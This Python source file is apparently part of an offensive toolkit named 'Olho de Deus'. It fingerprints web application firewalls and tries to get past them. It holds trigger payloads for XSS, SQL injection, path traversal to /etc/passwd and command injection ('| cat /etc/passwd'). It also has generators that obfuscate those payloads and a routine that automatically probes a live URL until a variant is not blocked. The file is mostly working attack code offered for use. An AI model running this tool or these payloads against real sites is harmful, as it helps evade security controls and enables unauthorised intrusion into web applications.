#!/usr/bin/env python3
"""
WAF Detector & Bypass - Detecção de WAFs e técnicas de bypass
Parte do toolkit Olho de Deus
"""

import os
import sys
import json
import re
import time
import random
from typing import List, Dict, Optional, Tuple
from dataclasses import dataclass
from urllib.parse import quote, urlencode
import requests


@dataclass
class WAFSignature:
    """Assinatura de WAF."""
    name: str
    vendor: str
    patterns: List[str]
    headers: List[str]
    cookies: List[str]
    status_codes: List[int]


class WAFDatabase:
    """Base de dados de assinaturas de WAF."""
    
    SIGNATURES = [
        WAFSignature(
            name="Cloudflare",
            vendor="Cloudflare Inc.",
            patterns=[r"cloudflare", r"cf-ray", r"__cfduid", r"cf-request-id"],
            headers=["cf-ray", "cf-cache-status", "cf-request-id", "server: cloudflare"],
            cookies=["__cfduid", "__cf_bm", "cf_clearance"],
            status_codes=[403, 503]
        ),
        WAFSignature(
            name="AWS WAF",
            vendor="Amazon Web Services",
            patterns=[r"awswaf", r"x-amz", r"aws"],
            headers=["x-amzn-requestid", "x-amz-cf-id", "x-amz-id-2"],
            cookies=[],
            status_codes=[403]
        ),
        WAFSignature(
            name="Akamai",
            vendor="Akamai Technologies",
            patterns=[r"akamai", r"akamaighost", r"akam", r"ghost"],
            headers=["x-akamai-transformed", "akamai-origin-hop"],
            cookies=["akamai", "ak_bmsc"],
            status_codes=[403]
        ),
        WAFSignature(
            name="Imperva/Incapsula",
            vendor="Imperva Inc.",
            patterns=[r"incapsula", r"imperva", r"visid_incap"],
            headers=["x-iinfo", "x-cdn"],
            cookies=["visid_incap", "incap_ses", "__incap"],
            status_codes=[403]
        ),
        WAFSignature(
            name="Sucuri",
            vendor="Sucuri Inc.",
            patterns=[r"sucuri", r"sucuri/cloudproxy"],
            headers=["x-sucuri-id", "x-sucuri-cache", "server: sucuri"],
            cookies=["sucuri_cloudproxy"],
            status_codes=[403]
        ),
        WAFSignature(
            name="ModSecurity",
            vendor="SpiderLabs/Trustwave",
            patterns=[r"mod_security", r"modsecurity", r"NOYB"],
            headers=["server: apache", "server: nginx"],
            cookies=[],
            status_codes=[403, 406]
        ),
        WAFSignature(
            name="F5 BIG-IP ASM",
            vendor="F5 Networks",
            patterns=[r"bigip", r"f5", r"ts[a-z0-9]{5,}"],
            headers=["x-wa-info", "server: bigip"],
            cookies=["ts", "bigip", "f5_cspm"],
            status_codes=[403]
        ),
        WAFSignature(
            name="Barracuda",
            vendor="Barracuda Networks",
            patterns=[r"barracuda", r"barra"],
            headers=["server: barracuda"],
            cookies=["barra_counter_session"],
            status_codes=[403]
        ),
        WAFSignature(
            name="Wordfence",
            vendor="Defiant Inc.",
            patterns=[r"wordfence", r"wf-", r"wfwaf"],
            headers=[],
            cookies=["wfwaf-authcookie"],
            status_codes=[403, 503]
        ),
        WAFSignature(
            name="Fortinet FortiWeb",
            vendor="Fortinet",
            patterns=[r"fortiweb", r"fortigate", r"fortinet"],
            headers=["server: fortiweb"],
            cookies=["fwb"],
            status_codes=[403]
        ),
        WAFSignature(
            name="DDoS-Guard",
            vendor="DDoS-Guard",
            patterns=[r"ddos-guard", r"ddosguard"],
            headers=["server: ddos-guard"],
            cookies=["__ddg"],
            status_codes=[403]
        ),
        WAFSignature(
            name="StackPath",
            vendor="StackPath",
            patterns=[r"stackpath", r"sp-"],
            headers=["x-sp-"],
            cookies=["sp_waf"],
            status_codes=[403]
        ),
    ]
    
    @classmethod
    def get_all(cls) -> List[WAFSignature]:
        return cls.SIGNATURES
    
    @classmethod
    def find_by_name(cls, name: str) -> Optional[WAFSignature]:
        for sig in cls.SIGNATURES:
            if name.lower() in sig.name.lower():
                return sig
        return None


class WAFDetector:
    """Detector de WAF."""
    
    TRIGGER_PAYLOADS = [
        "<script>alert(1)</script>",
        "' OR '1'='1",
        "../../etc/passwd",
        "{{7*7}}",
        "SELECT * FROM users",
        "<img src=x onerror=alert(1)>",
        "<?php phpinfo(); ?>",
        "../../../windows/win.ini",
        "; ls -la",
        "| cat /etc/passwd"
    ]
    
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        })
        self.detected_wafs: List[str] = []
    
    def detect(self, url: str) -> Dict:
        """Detecta WAF em uma URL."""
        results = {
            "url": url,
            "waf_detected": False,
            "waf_name": None,
            "vendor": None,
            "confidence": 0,
            "signatures_matched": [],
            "bypass_techniques": []
        }
        
        try:
            # Request normal primeiro
            normal_response = self.session.get(url, timeout=30)
            
            # Request com payload malicioso
            malicious_url = f"{url}?test={quote(self.TRIGGER_PAYLOADS[0])}"
            attack_response = self.session.get(malicious_url, timeout=30)
            
            # Analisar respostas
            detected = self._analyze_responses(normal_response, attack_response)
            
            if detected:
                results["waf_detected"] = True
                results["waf_name"] = detected[0]
                results["vendor"] = detected[1]
                results["confidence"] = detected[2]
                results["signatures_matched"] = detected[3]
                results["bypass_techniques"] = self._get_bypass_techniques(detected[0])
            
        except requests.exceptions.RequestException as e:
            results["error"] = str(e)
        
        return results
    
    def _analyze_responses(self, normal_resp, attack_resp) -> Optional[Tuple]:
        """Analisa respostas para detectar WAF."""
        all_headers = str(attack_resp.headers).lower()
        all_cookies = str(attack_resp.cookies).lower()
        body = attack_resp.text.lower()
        status = attack_resp.status_code
        
        for sig in WAFDatabase.get_all():
            matches = []
            confidence = 0
            
            # Verificar headers
            for header in sig.headers:
                if header.lower() in all_headers:
                    matches.append(f"Header: {header}")
                    confidence += 30
            
            # Verificar cookies
            for cookie in sig.cookies:
                if cookie.lower() in all_cookies:
                    matches.append(f"Cookie: {cookie}")
                    confidence += 25
            
            # Verificar patterns no body
            for pattern in sig.patterns:
                if re.search(pattern, body + all_headers, re.I):
                    matches.append(f"Pattern: {pattern}")
                    confidence += 20
            
            # Verificar status code
            if status in sig.status_codes:
                if normal_resp.status_code != status:
                    matches.append(f"Status code: {status}")
                    confidence += 15
            
            if confidence >= 30:
                return (sig.name, sig.vendor, min(confidence, 100), matches)
        
        # Detecção genérica
        if status in [403, 406, 503] and normal_resp.status_code == 200:
            generic_patterns = [
                r"blocked", r"denied", r"forbidden", r"not allowed",
                r"security", r"protection", r"firewall", r"rejected"
            ]
            for pattern in generic_patterns:
                if re.search(pattern, body, re.I):
                    return ("Unknown WAF", "Unknown", 50, [f"Generic pattern: {pattern}"])
        
        return None
    
    def _get_bypass_techniques(self, waf_name: str) -> List[str]:
        """Retorna técnicas de bypass para um WAF específico."""
        techniques = {
            "Cloudflare": [
                "Use IP origin direto (bypass DNS)",
                "Encoding duplo de payloads",
                "HTTP Parameter Pollution",
                "Chunked encoding",
                "Case randomization"
            ],
            "AWS WAF": [
                "Unicode normalization bypass",
                "Comments em payloads SQL",
                "JSON-based SQLi",
                "HTTP/2 specific attacks"
            ],
            "ModSecurity": [
                "HPP (HTTP Parameter Pollution)",
                "Null bytes injection",
                "Tab e newline em payloads",
                "Multipart encoding"
            ],
            "Imperva/Incapsula": [
                "Rate limiting bypass via IP rotation",
                "Encoding variations",
                "HTTP verb tampering"
            ],
            "Akamai": [
                "Cache poisoning",
                "Origin bypass via headers",
                "Path normalization bypass"
            ]
        }
        
        base_techniques = [
            "URL encoding variations (%XX, %uXXXX)",
            "Case mixing (SeLeCt, <ScRiPt>)",
            "Comment insertion (/**/)",
            "Whitespace alternatives (tabs, newlines)",
            "Null byte injection (%00)",
            "HTTP Parameter Pollution",
            "Double encoding",
            "Unicode/UTF-8 encoding",
            "Chunked transfer encoding"
        ]
        
        return techniques.get(waf_name, []) + base_techniques


class WAFBypass:
    """Gerador de payloads para bypass de WAF."""
    
    @staticmethod
    def encode_payload(payload: str, encoding: str) -> str:
        """Aplica encoding ao payload."""
        if encoding == "url":
            return quote(payload)
        elif encoding == "double_url":
            return quote(quote(payload))
        elif encoding == "unicode":
            return ''.join(f'\\u{ord(c):04x}' for c in payload)
        elif encoding == "hex":
            return payload.encode().hex()
        elif encoding == "html":
            return ''.join(f'&#{ord(c)};' for c in payload)
        elif encoding == "base64":
            import base64
            return base64.b64encode(payload.encode()).decode()
        return payload
    
    @staticmethod
    def case_randomize(payload: str) -> str:
        """Randomiza case de caracteres."""
        return ''.join(
            c.upper() if random.random() > 0.5 else c.lower()
            for c in payload
        )
    
    @staticmethod
    def insert_comments(payload: str, comment_type: str = "sql") -> str:
        """Insere comentários no payload."""
        if comment_type == "sql":
            # Insere /**/ entre caracteres de palavras-chave
            keywords = ["SELECT", "UNION", "FROM", "WHERE", "AND", "OR"]
            for kw in keywords:
                if kw in payload.upper():
                    commented = "/**/".join(kw)
                    payload = re.sub(kw, commented, payload, flags=re.I)
        elif comment_type == "html":
            payload = payload.replace("><", "><!---->< ")
        return payload
    
    @staticmethod
    def null_byte_inject(payload: str, positions: List[str] = None) -> List[str]:
        """Gera variações com null bytes."""
        results = [payload]
        null_variants = ["%00", "\\x00", "\\0"]
        
        for null in null_variants:
            results.append(null + payload)
            results.append(payload + null)
            results.append(payload.replace(" ", null + " "))
        
        return results
    
    @staticmethod
    def hpp_payloads(param: str, payload: str) -> List[Tuple[str, str]]:
        """Gera payloads para HTTP Parameter Pollution."""
        return [
            (f"{param}={payload}&{param}=safe", "HPP first wins"),
            (f"{param}=safe&{param}={payload}", "HPP last wins"),
            (f"{param}[]={payload}", "Array notation"),
            (f"{param}[0]={payload}", "Array index"),
        ]
    
    @classmethod
    def generate_bypass_payloads(cls, original_payload: str, target_waf: str = None) -> Dict[str, List[str]]:
        """Gera múltiplas variações de bypass para um payload."""
        results = {
            "original": [original_payload],
            "url_encoded": [],
            "double_encoded": [],
            "case_mixed": [],
            "with_comments": [],
            "null_bytes": [],
            "unicode": [],
            "html_entities": []
        }
        
        # URL encoding
        results["url_encoded"].append(cls.encode_payload(original_payload, "url"))
        
        # Double URL encoding
        results["double_encoded"].append(cls.encode_payload(original_payload, "double_url"))
        
        # Case randomization
        for _ in range(3):
            results["case_mixed"].append(cls.case_randomize(original_payload))
        
        # Com comentários
        results["with_comments"].append(cls.insert_comments(original_payload, "sql"))
        results["with_comments"].append(cls.insert_comments(original_payload, "html"))
        
        # Null bytes
        results["null_bytes"].extend(cls.null_byte_inject(original_payload))
        
        # Unicode
        results["unicode"].append(cls.encode_payload(original_payload, "unicode"))
        
        # HTML entities
        results["html_entities"].append(cls.encode_payload(original_payload, "html"))
        
        return results


class WAFTester:
    """Testa payloads de bypass contra WAF."""
    
    def __init__(self, delay: float = 1.0):
        self.delay = delay
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        })
    
    def test_bypass(self, url: str, param: str, payloads: List[str]) -> List[Dict]:
        """Testa lista de payloads contra WAF."""
        results = []
        
        for payload in payloads:
            try:
                test_url = f"{url}?{param}={quote(payload)}"
                response = self.session.get(test_url, timeout=30)
                
                result = {
                    "payload": payload[:50] + "..." if len(payload) > 50 else payload,
                    "status_code": response.status_code,
                    "blocked": response.status_code in [403, 406, 503],
                    "content_length": len(response.content)
                }
                
                results.append(result)
                
                time.sleep(self.delay)
                
            except Exception as e:
                results.append({
                    "payload": payload[:50],
                    "error": str(e),
                    "blocked": True
                })
        
        return results
    
    def find_working_bypass(self, url: str, param: str, original_payload: str) -> Optional[str]:
        """Encontra payload que bypassa WAF."""
        bypass_payloads = WAFBypass.generate_bypass_payloads(original_payload)
        
        for category, payloads in bypass_payloads.items():
            for payload in payloads:
                try:
                    test_url = f"{url}?{param}={quote(payload)}"
                    response = self.session.get(test_url, timeout=30)
                    
                    if response.status_code not in [403, 406, 503]:
                        return payload
                    
                    time.sleep(self.delay)
                    
                except Exception:
                    continue
        
        return None


def interactive_menu():
    """Menu interativo do WAF Detector."""
    detector = WAFDetector()
    tester = WAFTester()
    
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        print("""
╔══════════════════════════════════════════════════════════════╗
║           🛡️ WAF DETECTOR & BYPASS - Olho de Deus            ║
╠══════════════════════════════════════════════════════════════╣
║                                                              ║
║  [1] 🔍 Detectar WAF em URL                                  ║
║  [2] 🎯 Gerar Payloads de Bypass                             ║
║  [3] 🧪 Testar Payloads contra WAF                           ║
║  [4] 🔓 Encontrar Bypass Funcional                           ║
║  [5] 📋 Listar WAFs Conhecidos                               ║
║  [6] 📖 Ver Técnicas de Bypass                               ║
║                                                              ║
║  [0] Voltar                                                  ║
╚══════════════════════════════════════════════════════════════╝
        """)
        
        escolha = input("Opção: ").strip()
        
        if escolha == '0':
            break
        
        elif escolha == '1':
            print("\n=== Detectar WAF ===")
            url = input("URL para testar: ").strip()
            if not url:
                continue
            
            print(f"\nAnalisando {url}...")
            result = detector.detect(url)
            
            if result.get("waf_detected"):
                print(f"\n🛡️  WAF DETECTADO!")
                print(f"   Nome: {result['waf_name']}")
                print(f"   Vendor: {result['vendor']}")
                print(f"   Confiança: {result['confidence']}%")
                print(f"\n   Assinaturas encontradas:")
                for sig in result['signatures_matched']:
                    print(f"     • {sig}")
                print(f"\n   Técnicas de bypass sugeridas:")
                for tech in result['bypass_techniques'][:5]:
                    print(f"     • {tech}")
            else:
                print("\n✅ Nenhum WAF detectado (ou bypass natural)")
        
        elif escolha == '2':
            print("\n=== Gerar Payloads de Bypass ===")
            payload = input("Payload original: ").strip()
            if not payload:
                continue
            
            waf = input("WAF alvo (opcional, Enter para genérico): ").strip() or None
            
            bypasses = WAFBypass.generate_bypass_payloads(payload, waf)
            
            print("\n📋 Payloads de Bypass Gerados:\n")
            for category, payloads in bypasses.items():
                if payloads:
                    print(f"\n  [{category}]")
                    for p in payloads[:3]:
                        display = p[:60] + "..." if len(p) > 60 else p
                        print(f"    • {display}")
            
            save = input("\nSalvar em arquivo? (s/n): ").lower()
            if save == 's':
                os.makedirs("payloads", exist_ok=True)
                with open("payloads/waf_bypass.json", 'w') as f:
                    json.dump(bypasses, f, indent=2, ensure_ascii=False)
                print("✅ Salvo em payloads/waf_bypass.json")
        
        elif escolha == '3':
            print("\n=== Testar Payloads ===")
            url = input("URL alvo: ").strip()
            param = input("Parâmetro: ").strip()
            
            if not url or not param:
                continue
            
            print("\nPayloads para testar (um por linha, linha vazia para terminar):")
            payloads = []
            while True:
                p = input("  > ").strip()
                if not p:
                    break
                payloads.append(p)
            
            if not payloads:
                continue
            
            print(f"\nTestando {len(payloads)} payloads...\n")
            results = tester.test_bypass(url, param, payloads)
            
            print("Resultados:")
            for r in results:
                status = "🔴 BLOQUEADO" if r.get("blocked") else "🟢 PASSOU"
                print(f"  {status} | [{r.get('status_code', 'ERR')}] {r['payload']}")
        
        elif escolha == '4':
            print("\n=== Encontrar Bypass Funcional ===")
            url = input("URL alvo: ").strip()
            param = input("Parâmetro: ").strip()
            payload = input("Payload original (bloqueado): ").strip()
            
            if not all([url, param, payload]):
                continue
            
            print(f"\nProcurando bypass funcional...")
            working = tester.find_working_bypass(url, param, payload)
            
            if working:
                print(f"\n🟢 BYPASS ENCONTRADO!")
                print(f"   Payload: {working}")
            else:
                print("\n🔴 Nenhum bypass encontrado com técnicas automáticas.")
        
        elif escolha == '5':
            print("\n=== WAFs Conhecidos ===\n")
            for sig in WAFDatabase.get_all():
                print(f"  🛡️  {sig.name}")
                print(f"      Vendor: {sig.vendor}")
                print(f"      Cookies: {', '.join(sig.cookies) if sig.cookies else 'N/A'}")
                print()
        
        elif escolha == '6':
            print("\n=== Técnicas de Bypass ===\n")
            techniques = {
                "Encoding": [
                    "URL encoding (%XX)",
                    "Double URL encoding (%25XX)",
                    "Unicode encoding (\\uXXXX)",
                    "HTML entities (&#XX;)",
                    "Hex encoding"
                ],
                "Obfuscation": [
                    "Case randomization (SeLeCt)",
                    "Comment insertion (/**/)",
                    "Whitespace alternatives",
                    "Null byte injection (%00)"
                ],
                "Protocol": [
                    "HTTP Parameter Pollution (HPP)",
                    "Chunked transfer encoding",
                    "HTTP/2 specific",
                    "Method tampering (PUT, PATCH)"
                ],
                "Infrastructure": [
                    "Origin IP bypass",
                    "CDN cache poisoning",
                    "Header injection"
                ]
            }
            
            for cat, techs in techniques.items():
                print(f"  [{cat}]")
                for t in techs:
                    print(f"    • {t}")
                print()
        
        input("\nPressione Enter para continuar...")


if __name__ == "__main__":
    interactive_menu()
